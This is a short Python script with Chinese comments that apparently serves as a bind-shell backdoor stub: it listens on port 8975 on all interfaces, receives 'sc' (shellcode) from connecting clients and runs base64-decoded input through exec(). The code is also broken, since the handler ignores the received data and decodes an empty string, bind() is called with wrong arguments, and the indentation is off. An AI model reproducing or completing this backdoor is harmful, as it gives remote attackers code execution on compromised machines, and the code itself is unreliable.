import socket,base64,ctypes

# 执行上线端,端口自定义
# 绑定监听端口
# 接受发送过来的sc
# sc进行命令执行

def zhixing(cd):
    zx=''
    zx=base64.b64decode(zx)
    exec(zx)

if __name__ == '__main__':
    s=socket.socket()
    s.bind('0.0.0.0',8975)
    s.listen(5)
while True:
    ss,addr=s.accept()
    while True:
        cd=ss.recv(102400).decode()
        zhixing(cd)
ss.close()
s.close()
